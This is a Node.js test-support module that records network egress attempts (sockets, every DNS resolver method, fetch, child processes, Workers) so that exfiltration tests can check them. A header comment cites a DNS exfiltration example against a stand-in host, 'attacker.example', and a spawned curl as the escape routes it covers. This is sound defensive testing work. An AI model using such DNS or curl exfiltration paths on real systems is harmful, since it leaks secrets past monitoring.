// Test-support egress observer (review round 1): preloaded into a child via `--import`, it
// records every attempt to reach the network through Node's own APIs — TCP (which HTTP, TLS
// and fetch/undici all ride), UDP, the WHOLE dns surface, and the global fetch entry point —
// as one JSON line per attempt in SPENDBAR_NET_LOG. It observes and never blocks: the
// exfiltration tests assert on the recorded attempts, and their positive control proves the
// recording works by moving a canary through this exact interception path.
//
// Two round-1 chunk-16 corrections, both cases where the observer would have stayed silent
// while a canary left the process:
//
//   * DNS was `lookup` only. A name lookup is not the only way to put bytes in a query:
//     `dns.resolveTxt("<canary>.attacker.example")` needs no TCP and no UDP socket through the
//     patched methods, so the whole resolver surface — callback, promise, and Resolver
//     instances — is recorded now.
//   * A DESCENDANT is not observed at all. `child_process.spawn("curl", …)`, a Node child
//     without this preload, or a Worker with its own execArgv all reach the network outside
//     every patch here. They cannot be observed from inside this process, so they are recorded
//     as what they are: the creation of an unobserved execution context. The tests treat any
//     such record as a violation, because "no egress was observed" is only a claim about
//     egress if nothing could have escaped observation.
//
// Scope, stated honestly: this sees Node-API egress from THIS process, plus the creation of
// contexts it cannot see into. A native addon could bypass it, which is precluded separately —
// the supply-chain gate refuses any closure that carries native-build machinery.

import { syncBuiltinESMExports } from "node:module";
import net from "node:net";
import dgram from "node:dgram";
import dns from "node:dns";
import child_process from "node:child_process";
import worker_threads from "node:worker_threads";
import { appendFileSync } from "node:fs";

const LOG = process.env.SPENDBAR_NET_LOG;

/**
 * Record one attempt, and FAIL CLOSED if it cannot be recorded (review round 2, chunk 6).
 *
 * This used to swallow every serialization and append failure and then let the call through, so
 * a full or unwritable log filesystem — or an argument whose selected properties would not
 * serialize — produced real egress with no record at all, and the resulting empty log read as
 * "no egress was observed". The comment claimed a positive control would catch that; it cannot,
 * because a control that succeeded earlier says nothing about whether THIS record succeeded.
 *
 * So the record is built in two stages: a minimal always-serializable line first, then the
 * detail. If the line cannot be appended, this THROWS, and the network call never happens. An
 * observer that cannot observe must stop the thing it was watching, not wave it through.
 */
function record(api, args) {
  if (!LOG) return;
  let line;
  try {
    const a = args[0];
    const detail =
      a !== null && typeof a === "object"
        ? { host: a.host ?? a.hostname, port: a.port, path: a.path }
        : { arg: typeof a === "string" ? a : a === undefined ? undefined : String(a) };
    line = JSON.stringify({ api, detail });
  } catch {
    // The detail did not serialize. The ATTEMPT still gets recorded — losing the fact of an
    // egress attempt because its argument was exotic is the failure mode this whole file exists
    // to prevent.
    line = JSON.stringify({ api, detail: { unserializable: true } });
  }
  appendFileSync(LOG, line + "\n");
}

/**
 * The observer's own witness, written before anything is patched. Absence of this line means
 * the observer never started or could not write — which is NOT the same as "nothing tried to
 * reach the network", and used to be indistinguishable from it.
 */
export const NET_OBSERVE_SENTINEL = "net-observe/1 started";
if (LOG) appendFileSync(LOG, JSON.stringify({ api: NET_OBSERVE_SENTINEL, detail: {} }) + "\n");

function wrapMethod(target, name, api) {
  const original = target[name];
  target[name] = function (...args) {
    record(api, args);
    return original.apply(this, args);
  };
}

wrapMethod(net.Socket.prototype, "connect", "net.Socket.connect");
wrapMethod(dgram.Socket.prototype, "send", "dgram.send");
wrapMethod(dgram.Socket.prototype, "connect", "dgram.connect");

// The whole resolver surface, not just `lookup`: every one of these puts a caller-controlled
// name on the wire. Enumerated from the module's own exports so a Node version that adds a
// record type is covered without editing this list.
const DNS_METHODS = ["lookup", "lookupService", "reverse", ...Object.keys(dns).filter((k) => k.startsWith("resolve"))];
for (const name of DNS_METHODS) {
  if (typeof dns[name] === "function") wrapMethod(dns, name, `dns.${name}`);
  if (typeof dns.promises?.[name] === "function") wrapMethod(dns.promises, name, `dns.promises.${name}`);
  // A Resolver instance holds its own methods and never goes through the module object.
  if (typeof dns.Resolver?.prototype?.[name] === "function") {
    wrapMethod(dns.Resolver.prototype, name, `dns.Resolver.${name}`);
  }
  if (typeof dns.promises?.Resolver?.prototype?.[name] === "function") {
    wrapMethod(dns.promises.Resolver.prototype, name, `dns.promises.Resolver.${name}`);
  }
}

// Creating an execution context this observer cannot see into. Recorded as an egress
// CAPABILITY: the child may or may not reach the network, and that is exactly the problem —
// nothing here can say which.
//
// Patched in two places, because one is not enough. Node snapshots a builtin's ESM named
// exports when the module facade is instantiated — which this preload does itself, before it
// patches anything — so `import { spawn } from "node:child_process"` holds the ORIGINAL
// function and sails past a property patch. Every ASYNCHRONOUS path funnels through
// `ChildProcess.prototype.spawn` whatever the import style, so that is where the reliable
// observation goes; the property patches remain for `require()` and namespace access.
//
// The blind spot this comment used to DESCRIBE AS UNCLOSABLE is closed (review round 2, chunk
// 6). It claimed the synchronous spawns and `new Worker(...)` reached through an ESM named
// import could not be observed from inside the process and needed Node's permission model. That
// was wrong: `syncBuiltinESMExports()` pushes the wrapped functions into the named exports Node
// already snapshotted, and a direct experiment settles it — with the property patched and
// nothing else a named import records NOTHING, and with the sync call it records. It is invoked
// at the end of this file, after every replacement below.
for (const name of ["spawn", "spawnSync", "exec", "execSync", "execFile", "execFileSync", "fork"]) {
  if (typeof child_process[name] === "function") wrapMethod(child_process, name, `child_process.${name}`);
}
if (typeof child_process.ChildProcess?.prototype?.spawn === "function") {
  wrapMethod(child_process.ChildProcess.prototype, "spawn", "child_process.ChildProcess.spawn");
}
// A construct trap rather than a replacement function: see the identical note in
// instrument.mjs. An observer that changes the constructor semantics of the code it observes
// has invalidated the run it is reporting on.
if (typeof worker_threads.Worker === "function") {
  const OriginalWorker = worker_threads.Worker;
  worker_threads.Worker = new Proxy(OriginalWorker, {
    construct(target, args, newTarget) {
      record("worker_threads.Worker", args);
      return Reflect.construct(target, args, newTarget);
    },
  });
}

if (typeof globalThis.fetch === "function") wrapMethod(globalThis, "fetch", "fetch");

// LAST. Everything above patched module objects; this is what makes those patches visible to
// `import { resolveTxt } from "node:dns"` and every other ESM named binding.
syncBuiltinESMExports();
